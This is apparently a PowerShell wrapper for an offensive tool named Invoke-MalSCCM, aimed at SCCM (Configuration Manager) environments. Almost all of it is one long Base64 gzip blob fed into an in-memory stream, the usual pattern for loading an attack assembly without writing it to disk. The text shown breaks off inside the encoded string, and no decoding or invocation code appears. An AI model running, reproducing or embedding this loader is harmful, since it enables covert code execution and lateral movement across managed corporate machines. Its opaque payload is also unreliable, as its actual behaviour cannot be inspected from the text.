function Invoke-MalSCCM
{


    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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